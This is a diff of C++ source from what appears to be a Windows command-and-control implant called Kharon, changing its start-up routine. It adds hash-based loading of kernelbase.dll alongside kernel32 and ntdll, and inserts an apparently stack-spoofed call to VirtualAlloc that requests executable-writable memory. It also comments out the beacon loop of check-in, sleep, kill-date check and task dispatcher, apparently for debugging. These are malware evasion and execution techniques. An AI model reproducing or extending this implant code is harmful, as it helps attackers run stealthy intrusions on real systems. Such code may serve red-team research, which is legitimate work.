@@ -66,11 +66,13 @@ DECLFN Kharon::Kharon( VOID ) {
     this->Session.Base.Length = ( EndPtr() - this->Session.Base.Start );
 
     /* ========= [ init modules and funcs ] ========= */
-    this->Krnl32.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "kernel32.dll" ) );
-    this->Ntdll.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) );
+    this->Krnl32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "kernel32.dll" ) );
+    this->KrnlBase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "kernelbase.dll" ) );
+    this->Ntdll.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) );
 
     RSL_IMP( Ntdll  );
     RSL_IMP( Krnl32 );
+    RSL_IMP( KrnlBase );
 }
 
 auto DECLFN Kharon::Init(
@@ -300,22 +302,29 @@ auto DECLFN Kharon::Start(
     //
     // do checkin routine (request + validate connection)
     //
-    this->Tsp->Checkin();
 
-    do {            
-        //
-        // use the wrapper sleep function to run the 
-        //
-        this->Mk->Main( this->Session.SleepTime );
+    KhDbgz( "======================================" )
+    this->Spf->Call( 
+        this->Krnl32.Handle, (UPTR)this->Krnl32.VirtualAlloc,
+        0, 0x1000, 0x3000, 0x40, 0 
+    );
 
-        //
-        // kill date check and perform routine
-        //
-        this->Usf->CheckKillDate();
+    // this->Tsp->Checkin();
+
+    // do {            
+    //     //
+    //     // use the wrapper sleep function to run the 
+    //     //
+    //     this->Mk->Main( this->Session.SleepTime );
+
+    //     //
+    //     // kill date check and perform routine
+    //     //
+    //     this->Usf->CheckKillDate();
    
-        //
-        // start the dispatcher task routine
-        //
-        this->Tk->Dispatcher();
-    } while( 1 );
+    //     //
+    //     // start the dispatcher task routine
+    //     //
+    //     this->Tk->Dispatcher();
+    // } while( 1 );
 }
